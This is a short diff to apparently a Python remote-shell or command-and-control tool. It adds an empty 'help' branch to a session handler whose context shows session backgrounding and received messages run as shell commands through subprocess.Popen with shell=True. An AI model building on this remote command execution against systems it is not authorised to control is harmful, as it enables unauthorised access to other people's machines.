@@ -48,6 +48,8 @@ def session_handler():
             elif message == 'background':
                 # This command backs out of a current session so the server can interact with another
                 pass
+            elif message == 'help':
+                pass
             else:
                 # subprocess command handling
                 command = subprocess.Popen(message, shell = True, stdout = subprocess.PIPE, stderr = subprocess.PIPE)
